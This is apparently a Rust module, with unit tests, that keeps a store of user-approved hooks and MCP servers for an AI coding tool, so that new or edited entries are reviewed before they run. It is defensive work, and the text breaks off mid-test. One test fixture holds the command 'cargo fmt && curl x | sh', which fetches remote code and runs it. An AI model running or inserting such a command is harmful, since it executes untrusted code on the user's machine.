//! What the user has trusted to run (`docs/state/config-review.md`): the hooks in
//! their own and their projects' `hooks.json`, and each project's MCP
//! servers.
//!
//! A hook runs a shell command on its own whenever its event fires, outside
//! the permission prompt; a project's MCP server is a program the session
//! starts, or a URL it connects to, because a checked-in file says so. So
//! neither runs until the user has seen it: the boundary reviews what is new
//! or changed at startup, and this module is the pure half of that — the
//! `trust.json` store, what identifies a hook and a server entry, the
//! classification of each as trusted, new or changed, and the
//! read-modify-write core every answer is recorded through
//! ([`update_store`]). The file I/O lives in the binary boundary
//! (`tui::trust`), like every other config store.
//!
//! `trust.json` is keyed by the absolute path of the file each hook or
//! server was read from, and lives in the config home — never in the
//! project, since a checkout carrying its own approvals would approve
//! itself:
//!
//! ```json
//! { "hooks": { "/home/me/.alter-zero/hooks.json": [
//!       { "event": "PreToolUse", "matcher": "bash", "command": "./guard.sh" } ] },
//!   "mcp": { "/home/me/repo/.mcp.json": {
//!       "github": { "enabled": true, "fingerprint": "sha256:…",
//!                   "parts": { "transport": "http", "target": "sha256:…" } } } } }
//! ```
//!
//! A server decision keeps fingerprints and the names of the entry's
//! variables, never a value — not the URL, not the command line: a token can
//! sit in any of them, and `trust.json` is a file people sync with their
//! dotfiles ([`ServerParts`]).
//!
//! Unlike `permissions.json`'s best-effort parse, a malformed `trust.json` is
//! an **error** (the boundary fails closed — nothing trusted — and says so):
//! a guard file that silently reads as something other than what the user
//! decided must not stay quiet about it. Nor is it ever written over
//! ([`update_store`]): what the user decided before is still in it, waiting
//! for the typo to be fixed.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::hooks::{HookEvent, HooksFile};
use crate::mcp::{McpFile, McpServerConfig};

/// The `sha256:<hex>` fingerprint of `bytes` — what a server decision is
/// pinned to ([`server_fingerprint`]).
#[must_use]
pub fn fingerprint(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    let digest = hasher.finalize();
    let mut out = String::with_capacity(7 + digest.len() * 2);
    out.push_str("sha256:");
    for byte in digest {
        out.push_str(&format!("{byte:02x}"));
    }
    out
}

/// Is `root` a directory the project layer should read config from at all?
///
/// The **home directory is never a project** (the `checkpoint::cwd_scope`
/// instinct): a cwd with no `.git` ancestor falls back to itself as the
/// root, and launched in `~` that makes `{root}/.alter-zero` the user's own
/// config home — the layer would rediscover the user's `hooks.json` and
/// `mcp.json` as "project config". The boundary skips the layer instead (the
/// per-file identity guard in `tui::trust` catches the same collision when
/// `ALTER_ZERO_CONFIG_DIR` moves the config home somewhere else).
#[must_use]
pub fn is_project_root(root: &Path, home: Option<&Path>) -> bool {
    home != Some(root)
}

/// The directory a hook knows as the project — `$ALTER_ZERO_PROJECT_DIR`,
/// and Claude Code's `$CLAUDE_PROJECT_DIR` — given the session's `cwd` and
/// the nearest `.git` ancestor-or-self `found` there: that root when it is
/// one ([`is_project_root`]), else the `cwd`. The root the project layer
/// reads `.alter-zero/` from, so a project's `hooks.json` reaching its own
/// scripts as `${ALTER_ZERO_PROJECT_DIR}/.alter-zero/hooks/…` finds them
/// from any subdirectory (`docs/tools/hooks.md`).
#[must_use]
pub fn hooks_project_dir(cwd: &Path, found: Option<&Path>, home: Option<&Path>) -> PathBuf {
    match found {
        Some(root) if is_project_root(root, home) => root.to_path_buf(),
        _ => cwd.to_path_buf(),
    }
}

/// The project's hooks file: `{root}/.alter-zero/hooks.json`.
#[must_use]
pub fn project_hooks_file(root: &Path) -> PathBuf {
    root.join(".alter-zero").join("hooks.json")
}

/// The project's MCP files in precedence order: the app-specific
/// `.alter-zero/mcp.json` first (the skills convention — `.alter-zero`
/// outranks the compat name), then the Claude-Code-compat `.mcp.json`.
#[must_use]
pub fn project_mcp_files(root: &Path) -> [PathBuf; 2] {
    [
        root.join(".alter-zero").join("mcp.json"),
        root.join(".mcp.json"),
    ]
}

/// What a hook **is**, for trusting it: the event that fires it, the matcher
/// that selects it, and the command it runs. That is what decides what runs
/// and when — a `timeout` or a `statusMessage` changes neither, so editing
/// one asks nothing. The matcher is normalised ([`normalize_matcher`]), so
/// the three spellings of match-everything are one hook — and nothing else
/// is folded together, a padded matcher included.
#[derive(Debug, Clone, PartialEq, Eq, Hash, PartialOrd, Ord, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct HookIdentity {
    pub event: String,
    /// Empty for a group that matches everything.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub matcher: String,
    pub command: String,
}

impl HookIdentity {
    /// The review's item title: `PreToolUse · bash`, or `Stop` for a hook
    /// that matches everything.
    #[must_use]
    pub fn label(&self) -> String {
        if self.matcher.is_empty() {
            self.event.clone()
        } else if self.matcher.trim() != self.matcher {
            // Padded with spaces — a different hook from the bare name, so
            // the spaces must show.
            format!("{} · \"{}\"", self.event, self.matcher)
        } else {
            format!("{} · {}", self.event, self.matcher)
        }
    }
}

/// A group's matcher as a hook's identity carries it: exactly as the runner
/// reads it ([`crate::hooks::constraint`] — never trimmed, since ` Bash` and
/// `Bash` select different tools), the match-everything spellings — absent,
/// empty, `*` — all the empty string.
#[must_use]
pub fn normalize_matcher(raw: Option<&str>) -> String {
    crate::hooks::constraint(raw)
        .unwrap_or_default()
        .to_string()
}

/// The hook identity of `handler` under `event`'s `group`, when it is a hook
/// that can run there — a modelled event and a handler the runner would run
/// ([`crate::hooks::HookHandler::runnable_command`]). Anything else is
/// skipped whatever the trust says, so it is never asked about.
#[must_use]
pub fn hook_identity(
    event: &str,
    group: &crate::hooks::MatcherGroup,
    handler: &crate::hooks::HookHandler,
) -> Option<HookIdentity> {
    HookEvent::from_name(event)?;
    Some(HookIdentity {
        event: event.to_string(),
        matcher: normalize_matcher(group.matcher.as_deref()),
        command: handler.runnable_command()?,
    })
}

/// Every hook in `file` that can run, in the hook registry's event order
/// (the `/hooks` browser's), each once.
#[must_use]
pub fn runnable_hooks(file: &HooksFile) -> Vec<HookIdentity> {
    let mut out: Vec<HookIdentity> = Vec::new();
    for event in HookEvent::ALL {
        let Some(groups) = file.hooks.get(event.name()) else {
            continue;
        };
        for group in groups {
            for handler in &group.hooks {
                if let Some(identity) = hook_identity(event.name(), group, handler)
                    && !out.contains(&identity)
                {
                    out.push(identity);
                }
            }
        }
    }
    out
}

/// `file` keeping only the hooks `trusted` answers yes for — what the
/// runner is given. A handler that cannot run (another type, an unmodelled
/// event) is kept as it was: it never runs either way, and the runner's
/// skip warning about it still says why.
#[must_use]
pub fn trusted_only(file: &HooksFile, trusted: &dyn Fn(&HookIdentity) -> bool) -> HooksFile {
    let mut out = file.clone();
    for (event, groups) in &mut out.hooks {
        for group in groups.iter_mut() {
            let matcher_group = group.clone();
            group.hooks.retain(|handler| {
                hook_identity(event, &matcher_group, handler)
                    .is_none_or(|identity| trusted(&identity))
            });
        }
    }
    out
}

/// Where a hook stands with the user.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HookTrust {
    /// Listed for its file: it runs.
    Trusted,
    /// Never seen: it waits for the review.
    New,
    /// An edit of a trusted hook — a listed hook under the same event and
    /// matcher that the file no longer has. `previous` is that hook's
    /// command, the review's `was:` line.
    Changed { previous: String },
}

/// One runnable hook and where it stands — [`TrustFile::review_hooks`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HookReview {
    pub identity: HookIdentity,
    pub trust: HookTrust,
}

/// A server entry's fingerprint: the whole entry as `mcp::render_server`
/// writes it — command, args and env, or url and headers — so a decision is
/// pinned to everything that decides what runs.
#[must_use]
pub fn server_fingerprint(config: &McpServerConfig) -> String {
    fingerprint(crate::mcp::render_server(config).to_string().as_bytes())
}

/// One recorded server decision: on or off, for exactly this entry.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct ServerRecord {
    pub enabled: bool,
    pub fingerprint: String,
    /// What the entry was made of when decided, without its values — what a
    /// changed entry is compared against to say what changed.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub parts: Option<ServerParts>,
}

/// A server entry's shape without its values: its transport, a
/// fingerprint of its command line or URL, and the names of its `env`
/// variables or headers, each beside a fingerprint of its value. Enough to
/// say **what** changed in an entry ([`ServerParts::changes`]) — nothing a
/// token could be read back from.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct ServerParts {
    /// `stdio`, `http` or `sse`.
    pub transport: String,
    /// The fingerprint of the command and its args, or of the URL.
    pub target: String,
    /// `env` variable (a local server) or header (a remote one) name → the
    /// fingerprint of its value.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub values: BTreeMap<String, String>,
    /// The fingerprint of a remote entry's pre-registered OAuth client
    /// block, when it has one.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub oauth: Option<String>,
}

impl ServerParts {
    /// The parts of `config`.
    #[must_use]
    pub fn of(config: &McpServerConfig) -> Self {
        let (target, values) = match config {
            McpServerConfig::Stdio { command, args, env } => {
                // Structured, so `["a b"]` and `["a", "b"]` stay apart.
                let line = serde_json::to_string(&(command, args)).unwrap_or_default();
                (fingerprint(line.as_bytes()), env)
            }
            McpServerConfig::Http { url, headers, .. }
            | McpServerConfig::Sse { url, headers, .. } => (fingerprint(url.as_bytes()), headers),
        };
        let oauth = config.oauth().map(|_| {
            fingerprint(
                crate::mcp::render_server(config)["oauth"]
                    .to_string()
                    .as_bytes(),
            )
        });
        Self {
            transport: config.transport_label().to_string(),
            target,
            oauth,
            values: values
                .iter()
                .map(|(name, value)| {
                    let pair = format!("{name}={value}");
                    (name.clone(), fingerprint(pair.as_bytes()))
                })
                .collect(),
        }
    }

    /// What changed from `self` (what was decided on) to `now`, in the
    /// review's order: the transport alone when it changed — the rest is
    /// then a different server's, nothing to compare — else the command
    /// line or URL, then each variable or header added, removed or given
    /// another value. Empty when every part is the same and only something
    /// the parts do not name changed (an `http` entry's `type` dropped).
    #[must_use]
    pub fn changes(&self, now: &Self) -> Vec<ServerChange> {
        if self.transport != now.transport {
            return vec![ServerChange::Transport {
                was: self.transport.clone(),
            }];
        }
        let mut out = Vec::new();
        if self.target != now.target {
            out.push(if now.transport == "stdio" {
                ServerChange::CommandLine
            } else {
                ServerChange::Url
            });
        }
        let kind = if now.transport == "stdio" {
            "env"
        } else {
            "header"
        };
        for (name, value) in &now.values {
            match self.values.get(name) {
                None => out.push(ServerChange::Added {
                    kind,
                    name: name.clone(),
                }),
                Some(was) if was != value => out.push(ServerChange::Value {
                    kind,
                    name: name.clone(),
                }),
                Some(_) => {}
            }
        }
        for name in self.values.keys() {
            if !now.values.contains_key(name) {
                out.push(ServerChange::Removed {
                    kind,
                    name: name.clone(),
                });
            }
        }
        if self.oauth != now.oauth {
            out.push(ServerChange::OAuthClient);
        }
        out
    }
}

/// One way a server entry changed since it was decided on — a part of the
/// review's `changed:` line.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ServerChange {
    /// Another transport; it was `was`.
    Transport { was: String },
    /// A local server's command or args.
    CommandLine,
    /// A remote server's URL.
    Url,
    /// An `env` variable or a header (`kind`) that was not there.
    Added { kind: &'static str, name: String },
    /// One that is gone.
    Removed { kind: &'static str, name: String },
    /// One that is there still, with another value.
    Value { kind: &'static str, name: String },
    /// A remote server's pre-registered OAuth client, added, removed or
    /// changed.
    OAuthClient,
}

impl ServerChange {
    /// The change in words — `env NODE_OPTIONS added`, `the command line`.
    #[must_use]
    pub fn describe(&self) -> String {
        match self {
            Self::Transport { was } => format!("the transport (was {was})"),
            Self::CommandLine => "the command line".to_string(),
            Self::Url => "the URL".to_string(),
            Self::Added { kind, name } => format!("{kind} {name} added"),
            Self::Removed { kind, name } => format!("{kind} {name} removed"),
            Self::Value { kind, name } => format!("{kind} {name}'s value"),
            Self::OAuthClient => "the OAuth client".to_string(),
        }
    }
}

/// Where a project server stands with the user.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ServerTrust {
    /// Decided on, at this entry: enabled.
    Enabled,
    /// Decided on, at this entry: disabled.
    Disabled,
    /// Never decided on: it waits for the review.
    New,
    /// Decided on, but the entry changed since — `changes` says what, the
    /// review's `changed:` line.
    Changed { changes: Vec<ServerChange> },
}

impl ServerTrust {
    /// May it run?
    #[must_use]
    pub const fn approved(&self) -> bool {
        matches!(self, Self::Enabled)
    }

    /// Does it wait for the review?
    #[must_use]
    pub const fn needs_review(&self) -> bool {
        matches!(self, Self::New | Self::Changed { .. })
    }
}

/// One project server and where it stands — [`review_servers`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ServerReview {
    /// The absolute path of the file it is declared in — the store's key.
    pub source: String,
    pub name: String,
    pub config: McpServerConfig,
    pub trust: ServerTrust,
}

/// The parsed `trust.json`.
#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct TrustFile {
    /// hooks file → the hooks trusted in it.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    hooks: BTreeMap<String, Vec<HookIdentity>>,
    /// MCP file → server name → the decision.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    mcp: BTreeMap<String, BTreeMap<String, ServerRecord>>,
    /// The `/trust` era's approvals not carried over yet: project root →
    /// file → the fingerprint of the bytes it approved. Kept through every
    /// write for the projects not opened since, and dropped file by file as
    /// each is carried over ([`TrustFile::migrate_legacy`]).
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    projects: BTreeMap<String, LegacyProject>,
}

/// One project's `/trust`-era approval: file → the fingerprint of the bytes
/// it approved.
#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
struct LegacyProject {
    #[serde(default)]
    files: BTreeMap<String, String>,
}

impl TrustFile {
    /// Parse a `trust.json` body. An empty/whitespace file is an empty store.
    ///
    /// # Errors
    /// The serde message when the text is not valid JSON of this exact shape
    /// — including unknown fields, because a guard file with keys we don't
    /// model is a guard file we don't understand. The caller fails closed
    /// (nothing trusted) and surfaces the error.
    pub fn parse(text: &str) -> Result<Self, String> {
        if text.trim().is_empty() {
            return Ok(Self::default());
        }
        serde_json::from_str(text).map_err(|err| err.to_string())
    }

    /// The store as `trust.json` holds it, its last line ended.
    #[must_use]
    pub fn serialize(&self) -> String {
        let mut text = serde_json::to_string_pretty(self).unwrap_or_default();
        text.push('\n');
        text
    }

    /// Is `identity` trusted in the hooks file `source`?
    #[must_use]
    pub fn is_hook_trusted(&self, source: &str, identity: &HookIdentity) -> bool {
        self.hooks
            .get(source)
            .is_some_and(|trusted| trusted.contains(identity))
    }

    /// Every hook in `file` (read from `source`) that can run, with where it
    /// stands — in [`runnable_hooks`] order. A hook is trusted while exactly
    /// it is listed for the file, wherever it sits; an untrusted one is
    /// **changed** when a listed hook under the same event and matcher is
    /// gone from the file (each such hook pairs with one untrusted hook, in
    /// order), else **new**.
    #[must_use]
    pub fn review_hooks(&self, source: &str, file: &HooksFile) -> Vec<HookReview> {
        let recorded = self.hooks.get(source).map_or(&[][..], Vec::as_slice);
        let current = runnable_hooks(file);
        let mut gone: Vec<&HookIdentity> = recorded
            .iter()
            .filter(|hook| !current.contains(hook))
            .collect();
        current
            .into_iter()
            .map(|identity| {
                let trust = if recorded.contains(&identity) {
                    HookTrust::Trusted
                } else if let Some(at) = gone
                    .iter()
                    .position(|old| old.event == identity.event && old.matcher == identity.matcher)
                {
                    HookTrust::Changed {
                        previous: gone.remove(at).command.clone(),
                    }
                } else {
                    HookTrust::New
                };
                HookReview { identity, trust }
            })
            .collect()
    }

    /// Where the server `name`, declared in `source` as `config`, stands.
    #[must_use]
    pub fn server_trust(&self, source: &str, name: &str, config: &McpServerConfig) -> ServerTrust {
        match self.mcp.get(source).and_then(|servers| servers.get(name)) {
            Some(record) if record.fingerprint == server_fingerprint(config) => {
                if record.enabled {
                    ServerTrust::Enabled
                } else {
                    ServerTrust::Disabled
                }
            }
            Some(record) => ServerTrust::Changed {
                changes: record
                    .parts
                    .as_ref()
                    .map(|parts| parts.changes(&ServerParts::of(config)))
                    .unwrap_or_default(),
            },
            None => ServerTrust::New,
        }
    }

    /// Record a hooks decision for `source`, whose current parse is `file`:
    /// `trust` become trusted, `distrust` stop being trusted, and the file's
    /// record is rewritten to its current trusted hooks — so a hook removed
    /// from the file is dropped, and the same command added back later is
    /// asked about again. The old version of an edited hook that is still
    /// untrusted is kept, so the next review can still say what it was.
    /// Every other file's record, and every server decision, is left alone.
    pub fn record_hooks(
        &mut self,
        source: &str,
        file: &HooksFile,
        trust: &[HookIdentity],
        distrust: &[HookIdentity],
    ) {
        let reviews = self.review_hooks(source, file);
        let mut list: Vec<HookIdentity> = Vec::new();
        for review in &reviews {
            let identity = &review.identity;
            let trusted = (review.trust == HookTrust::Trusted || trust.contains(identity))
                && !distrust.contains(identity);
            if trusted && !list.contains(identity) {
                list.push(identity.clone());
            }
        }
        for review in &reviews {
            if let HookTrust::Changed { previous } = &review.trust
                && !list.contains(&review.identity)
            {
                let old = HookIdentity {
                    command: previous.clone(),
                    ..review.identity.clone()
                };
                if !list.contains(&old) {
                    list.push(old);
                }
            }
        }
        if list.is_empty() {
            self.hooks.remove(source);
        } else {
            self.hooks.insert(source.to_string(), list);
        }
    }

    /// Record server decisions for `source`, whose current parse is `file`:
    /// each `(name, enabled)` in `decisions` is recorded pinned to the
    /// server's current entry. A server of the file not decided on now keeps
    /// whatever was recorded for it (a changed entry's old record is what
    /// its `changed:` line compares against); a server no longer in the file
    /// is dropped. Every other file's record, and every hook, is left alone.
    pub fn record_servers(&mut self, source: &str, file: &McpFile, decisions: &[(String, bool)]) {
        let old = self.mcp.remove(source).unwrap_or_default();
        let mut servers = BTreeMap::new();
        for (name, config) in &file.servers {
            if let Some((_, enabled)) = decisions.iter().find(|(decided, _)| decided == name) {
                servers.insert(
                    name.clone(),
                    ServerRecord {
                        enabled: *enabled,
                        fingerprint: server_fingerprint(config),
                        parts: Some(ServerParts::of(config)),
                    },
                );
            } else if let Some(record) = old.get(name) {
                servers.insert(name.clone(), record.clone());
            }
        }
        if !servers.is_empty() {
            self.mcp.insert(source.to_string(), servers);
        }
    }

    /// Carry the `/trust` era's approvals over for the project at `root`
    /// (`docs/state/config-review.md`). `/trust` approved a project's files whole,
    /// pinned to their bytes; a file it approved at exactly its current
    /// bytes keeps that approval here — its hooks recorded trusted, its
    /// servers enabled unless one was decided on since — and its old record
    /// goes. A file edited since keeps its old record unread, since what
    /// `/trust` approved is not what is there now. `hooks` and `mcp` are the
    /// project's parsed files as `(absolute path, fingerprint of its bytes,
    /// parse)`. Whether anything was carried over — the caller writes the
    /// store back then.
    pub fn migrate_legacy(
        &mut self,
        root: &str,
        hooks: Option<(&str, &str, &HooksFile)>,
        mcp: &[(&str, &str, &McpFile)],
    ) -> bool {
        let approved = |store: &Self, path: &str, fingerprint: &str| {
            store
                .projects
                .get(root)
                .and_then(|project| project.files.get(path))
                .is_some_and(|recorded| recorded == fingerprint)
        };
        let mut carried = Vec::new();
        if let Some((path, fingerprint, file)) = hooks
            && approved(self, path, fingerprint)
        {
            self.record_hooks(path, file, &runnable_hooks(file), &[]);
            carried.push(path);
        }
        for &(path, fingerprint, file) in mcp {
            if !approved(self, path, fingerprint) {
                continue;
            }
            let decided = self.mcp.get(path);
            let enable: Vec<(String, bool)> = file
                .servers
                .iter()
                .filter(|(name, _)| decided.is_none_or(|servers| !servers.contains_key(name)))
                .map(|(name, _)| (name.clone(), true))
                .collect();
            self.record_servers(path, file, &enable);
            carried.push(path);
        }
        if let Some(project) = self.projects.get_mut(root) {
            for path in &carried {
                project.files.remove(*path);
            }
            if project.files.is_empty() {
                self.projects.remove(root);
            }
        }
        !carried.is_empty()
    }
}

/// Apply `change` to the store `existing` holds and return the text to
/// write — the read-modify-write every decision goes through, over the file
/// as it is **when the decision is made**, so two sessions answering at once
/// never erase each other's answers. An empty `existing` (no file yet) is an
/// empty store.
///
/// # Errors
/// The parse error when `existing` is not a store this module understands:
/// a malformed file is never written over — whatever the user decided before
/// is still in it, waiting for the typo to be fixed — so the caller keeps the
/// decision for the session only, and says so.
pub fn update_store(existing: &str, change: impl FnOnce(&mut TrustFile)) -> Result<String, String> {
    let mut store = TrustFile::parse(existing)?;
    change(&mut store);
    Ok(store.serialize())
}

/// Every project server across `files` (`(absolute path, parse)`, in
/// precedence order) with where it stands — the first file declaring a name
/// is the one that counts, the project layer's first-name-wins rule
/// (`docs/state/project-config.md`).
#[must_use]
pub fn review_servers(store: &TrustFile, files: &[(&str, &McpFile)]) -> Vec<ServerReview> {
    let mut out: Vec<ServerReview> = Vec::new();
    for (source, file) in files {
        for (name, config) in &file.servers {
            if out.iter().any(|review| review.name == *name) {
                continue;
            }
            out.push(ServerReview {
                source: (*source).to_string(),
                name: name.clone(),
                config: config.clone(),
                trust: store.server_trust(source, name, config),
            });
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A remote entry's pre-registered OAuth client is part of what was
    /// decided on: another client is a change the review names.
    #[test]
    fn another_oauth_client_is_a_change_the_review_names() {
        let entry = |client: &str| {
            crate::mcp::parse_server_entry(&format!(
                r#"{{"url":"https://x.test/mcp","oauth":{{"clientId":"{client}"}}}}"#
            ))
            .unwrap()
        };
        let was = ServerParts::of(&entry("one"));
        let now = ServerParts::of(&entry("two"));
        assert_eq!(was.changes(&now), [ServerChange::OAuthClient]);
        assert_eq!(ServerChange::OAuthClient.describe(), "the OAuth client");
        // An entry without one keeps the parts it always had.
        let plain = crate::mcp::parse_server_entry(r#"{"url":"https://x.test/mcp"}"#).unwrap();
        let json = serde_json::to_string(&ServerParts::of(&plain)).unwrap();
        assert!(!json.contains("oauth"), "{json}");
    }

    const USER: &str = "/home/u/.alter-zero/hooks.json";
    const PROJECT: &str = "/repo/.alter-zero/hooks.json";
    const MCP: &str = "/repo/.mcp.json";

    fn hooks(text: &str) -> HooksFile {
        HooksFile::parse(text).expect("fixture parses")
    }

    fn hook(event: &str, matcher: &str, command: &str) -> HookIdentity {
        HookIdentity {
            event: event.to_string(),
            matcher: matcher.to_string(),
            command: command.to_string(),
        }
    }

    fn servers(text: &str) -> McpFile {
        crate::mcp::parse_mcp_file(text)
    }

    /// A hooks decision recorded over the store `existing` holds.
    fn recorded_hooks(
        existing: &str,
        source: &str,
        file: &HooksFile,
        trust: &[HookIdentity],
        distrust: &[HookIdentity],
    ) -> String {
        update_store(existing, |store| {
            store.record_hooks(source, file, trust, distrust);
        })
        .expect("the store parses")
    }

    /// Server decisions recorded over the store `existing` holds.
    fn recorded_servers(
        existing: &str,
        source: &str,
        file: &McpFile,
        decisions: &[(String, bool)],
    ) -> String {
        update_store(existing, |store| {
            store.record_servers(source, file, decisions)
        })
        .expect("the store parses")
    }

    fn trust_of(reviews: &[HookReview]) -> Vec<(String, HookTrust)> {
        reviews
            .iter()
            .map(|review| (review.identity.command.clone(), review.trust.clone()))
            .collect()
    }

    const STOP_FMT: &str =
        r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"cargo fmt"}]}]}}"#;

    #[test]
    fn the_hooks_project_dir_is_the_root_the_project_layer_reads() {
        let home = Some(Path::new("/home/u"));
        // Launched in a subdirectory: the repository's root, where the
        // project's `.alter-zero/hooks.json` and its scripts live.
        assert_eq!(
            hooks_project_dir(Path::new("/repo/src"), Some(Path::new("/repo")), home),
            PathBuf::from("/repo")
        );
        // No repository above: the directory it was launched in.
        assert_eq!(
            hooks_project_dir(Path::new("/tmp/scratch"), None, home),
            PathBuf::from("/tmp/scratch")
        );
        // A repository at home is never the project (`is_project_root`):
        // `{home}/.alter-zero` is the user's own config home.
        assert_eq!(
            hooks_project_dir(
                Path::new("/home/u/code/x"),
                Some(Path::new("/home/u")),
                home
            ),
            PathBuf::from("/home/u/code/x")
        );
    }

    #[test]
    fn fingerprint_is_stable_and_content_sensitive() {
        assert_eq!(fingerprint(b"hello"), fingerprint(b"hello"));
        assert_ne!(fingerprint(b"hello"), fingerprint(b"hello!"));
        // A well-known vector, so the encoding can never silently change.
        assert_eq!(
            fingerprint(b""),
            "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
    }

    #[test]
    fn the_project_paths_hang_off_the_alter_zero_dir() {
        let root = Path::new("/repo");
        assert_eq!(
            project_hooks_file(root),
            PathBuf::from("/repo/.alter-zero/hooks.json")
        );
        let [preferred, compat] = project_mcp_files(root);
        assert_eq!(preferred, PathBuf::from("/repo/.alter-zero/mcp.json"));
        assert_eq!(compat, PathBuf::from("/repo/.mcp.json"));
    }

    #[test]
    fn the_home_directory_is_never_a_project() {
        // Launching in `~` resolves the fallback root to the home dir, where
        // `{root}/.alter-zero` IS the user's own config home.
        assert!(!is_project_root(
            Path::new("/home/me"),
            Some(Path::new("/home/me"))
        ));
        assert!(is_project_root(
            Path::new("/home/me/repo"),
            Some(Path::new("/home/me"))
        ));
        assert!(is_project_root(Path::new("/tmp/proj"), None));
    }

    #[test]
    fn runnable_hooks_lists_every_hook_that_can_run_in_registry_order_once() {
        let file = hooks(
            r#"{"hooks":{
                "SessionStart":[{"hooks":[{"type":"command","command":"./start.sh"}]}],
                "UserPromptSubmit":[
                    {"matcher":"*","hooks":[{"type":"command","command":"./a.sh"}]},
                    {"hooks":[
                        {"type":"command","command":"./a.sh"},
                        {"type":"prompt","command":"./never.sh"}
                    ]}
                ],
                "PreToolUse":[{"matcher":" bash|write ","hooks":[
                    {"type":"command","command":"./guard.sh"},
                    {"type":"command","command":"./scoped.sh","if":"Bash(git *)"}
                ]}],
                "FileChanged":[{"hooks":[{"type":"command","command":"./unmodelled.sh"}]}]
            }}"#,
        );
        assert_eq!(
            runnable_hooks(&file),
            vec![
                // The registry's order, not the file map's alphabetical one —
                // and the matcher as the runner reads it, untrimmed.
                hook("PreToolUse", " bash|write ", "./guard.sh"),
                // `*`, empty and absent are one match-everything matcher, so
                // the same command under both groups is one hook.
                hook("UserPromptSubmit", "", "./a.sh"),
                hook("SessionStart", "", "./start.sh"),
            ]
        );
    }

    #[test]
    fn a_hook_identity_labels_its_event_and_matcher() {
        assert_eq!(hook("PreToolUse", "bash", "x").label(), "PreToolUse · bash");
        assert_eq!(hook("Stop", "", "x").label(), "Stop");
        // A matcher padded with spaces is quoted, or ` Bash` and `Bash` —
        // two different hooks — would read the same.
        assert_eq!(
            hook("PreToolUse", " Bash", "x").label(),
            r#"PreToolUse · " Bash""#
        );
    }

    #[test]
    fn a_matcher_is_kept_exactly_as_the_runner_reads_it() {
        // The runner never trims a matcher (`hooks::constraint`): ` Bash` is
        // a regex no tool name matches, `Bash` fires on every bash call. So
        // trusting the first must not trust the second.
        let quiet = hooks(
            r#"{"hooks":{"PreToolUse":[{"matcher":" Bash","hooks":[{"type":"command","command":"./guard.sh"}]}]}}"#,
        );
        let loud = hooks(
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"./guard.sh"}]}]}}"#,
        );
        let text = recorded_hooks("", PROJECT, &quiet, &runnable_hooks(&quiet), &[]);
        let store = TrustFile::parse(&text).expect("recorded store parses");
        assert_eq!(
            trust_of(&store.review_hooks(PROJECT, &loud)),
            vec![("./guard.sh".to_string(), HookTrust::New)]
        );
        // …and a lone space is a pattern, not the match-everything matcher.
        let space = hooks(
            r#"{"hooks":{"Stop":[{"matcher":" ","hooks":[{"type":"command","command":"./x.sh"}]}]}}"#,
        );
        assert_eq!(runnable_hooks(&space), vec![hook("Stop", " ", "./x.sh")]);
    }

    #[test]
    fn an_empty_store_trusts_no_hook_and_calls_each_one_new() {
        let store = TrustFile::parse("").expect("empty store parses");
        let reviews = store.review_hooks(USER, &hooks(STOP_FMT));
        assert_eq!(
            trust_of(&reviews),
            vec![("cargo fmt".to_string(), HookTrust::New)]
        );
        assert!(!store.is_hook_trusted(USER, &hook("Stop", "", "cargo fmt")));
    }

    #[test]
    fn a_trusted_hook_stays_trusted_wherever_it_moves_in_its_file() {
        let file = hooks(
            r#"{"hooks":{"Stop":[{"hooks":[
                {"type":"command","command":"./one.sh"},
                {"type":"command","command":"./two.sh"}
            ]}]}}"#,
        );
        let text = recorded_hooks("", USER, &file, &[hook("Stop", "", "./two.sh")], &[]);
        let moved = hooks(
            r#"{"hooks":{"Stop":[{"hooks":[
                {"type":"command","command":"./two.sh","timeout":5},
                {"type":"command","command":"./one.sh"}
            ]}]}}"#,
        );
        let store = TrustFile::parse(&text).expect("recorded store parses");
        assert_eq!(
            trust_of(&store.review_hooks(USER, &moved)),
            vec![
                ("./two.sh".to_string(), HookTrust::Trusted),
                ("./one.sh".to_string(), HookTrust::New),
            ]
        );
    }

    #[test]
    fn an_edited_hook_is_changed_and_says_what_it_was() {
        let text = recorded_hooks(
            "",
            USER,
            &hooks(STOP_FMT),
            &[hook("Stop", "", "cargo fmt")],
            &[],
        );
        let edited = hooks(
            r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"cargo fmt && curl x | sh"}]}]}}"#,
        );
        let store = TrustFile::parse(&text).expect("recorded store parses");
        assert_eq!(
            trust_of(&store.review_hooks(USER, &edited)),
            vec![(
                "cargo fmt && curl x | sh".to_string(),
                HookTrust::Changed {
                    previous: "cargo fmt".to_string()
                }
            )]
        );
    }

    #[test]
    fn a_hook_under_another_event_or_matcher_is_new_not_changed() {
        let text = recorded_hooks(
            "",
            USER,
            &hooks(STOP_FMT),
            &[hook("Stop", "", "cargo fmt")],
            &[],
        );
        let moved = hooks(
            r#"{"hooks":{
                "PreToolUse":[{"matcher":"bash","hooks":[{"type":"command","command":"cargo fmt"}]}]
            }}"#,
        );
        let store = TrustFile::parse(&text).expect("recorded store parses");
